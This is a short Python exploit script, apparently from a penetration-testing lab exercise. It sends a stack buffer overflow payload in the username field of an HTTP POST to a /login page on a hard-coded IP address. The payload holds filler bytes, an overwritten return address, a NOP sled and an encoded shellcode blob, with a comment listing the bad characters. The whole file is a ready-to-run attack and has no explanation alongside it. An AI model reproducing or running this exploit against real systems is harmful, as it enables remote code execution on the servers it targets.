#!/usr/bin/python3
import socket

#badchars are \x00\x0a\x0d\x25\x26\x2b\x3d


try:
  print ("\nSending evil buffer...")
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10"
  offset = b"C" * 4
  nops = b"\x90" * 10
  shellcode = (b"\xda\xc1\xbe\xaa\xe7\xb6\xc6\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
b"\x52\x83\xc5\x04\x31\x75\x13\x03\xdf\xf4\x54\x33\xe3\x13\x1a"
b"\xbc\x1b\xe4\x7b\x34\xfe\xd5\xbb\x22\x8b\x46\x0c\x20\xd9\x6a"
b"\xe7\x64\xc9\xf9\x85\xa0\xfe\x4a\x23\x97\x31\x4a\x18\xeb\x50"
b"\xc8\x63\x38\xb2\xf1\xab\x4d\xb3\x36\xd1\xbc\xe1\xef\x9d\x13"
b"\x15\x9b\xe8\xaf\x9e\xd7\xfd\xb7\x43\xaf\xfc\x96\xd2\xbb\xa6"
b"\x38\xd5\x68\xd3\x70\xcd\x6d\xde\xcb\x66\x45\x94\xcd\xae\x97"
b"\x55\x61\x8f\x17\xa4\x7b\xc8\x90\x57\x0e\x20\xe3\xea\x09\xf7"
b"\x99\x30\x9f\xe3\x3a\xb2\x07\xcf\xbb\x17\xd1\x84\xb0\xdc\x95"
b"\xc2\xd4\xe3\x7a\x79\xe0\x68\x7d\xad\x60\x2a\x5a\x69\x28\xe8"
b"\xc3\x28\x94\x5f\xfb\x2a\x77\x3f\x59\x21\x9a\x54\xd0\x68\xf3"
b"\x99\xd9\x92\x03\xb6\x6a\xe1\x31\x19\xc1\x6d\x7a\xd2\xcf\x6a"
b"\x7d\xc9\xa8\xe4\x80\xf2\xc8\x2d\x47\xa6\x98\x45\x6e\xc7\x72"
b"\x95\x8f\x12\xd4\xc5\x3f\xcd\x95\xb5\xff\xbd\x7d\xdf\x0f\xe1"
b"\x9e\xe0\xc5\x8a\x35\x1b\x8e\x74\x61\x22\x2a\x1d\x70\x24\xb3"
b"\x66\xfd\xc2\xd9\x88\xa8\x5d\x76\x30\xf1\x15\xe7\xbd\x2f\x50"
b"\x27\x35\xdc\xa5\xe6\xbe\xa9\xb5\x9f\x4e\xe4\xe7\x36\x50\xd2"
b"\x8f\xd5\xc3\xb9\x4f\x93\xff\x15\x18\xf4\xce\x6f\xcc\xe8\x69"
b"\xc6\xf2\xf0\xec\x21\xb6\x2e\xcd\xac\x37\xa2\x69\x8b\x27\x7a"
b"\x71\x97\x13\xd2\x24\x41\xcd\x94\x9e\x23\xa7\x4e\x4c\xea\x2f"
b"\x16\xbe\x2d\x29\x17\xeb\xdb\xd5\xa6\x42\x9a\xea\x07\x03\x2a"
b"\x93\x75\xb3\xd5\x4e\x3e\xd3\x37\x5a\x4b\x7c\xee\x0f\xf6\xe1"
b"\x11\xfa\x35\x1c\x92\x0e\xc6\xdb\x8a\x7b\xc3\xa0\x0c\x90\xb9"
b"\xb9\xf8\x96\x6e\xb9\x28")

  inputBuffer = filler + eip + offset + nops + shellcode
  
  content = b"username=" + inputBuffer + b"&password=A"
  


  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: 10.11.0.22\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  
  buffer += content

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.1.102", 80))
  s.send(buffer)
  
  s.close()
  
  print (buffer)
  
except socket.error:
  print (socket.error)
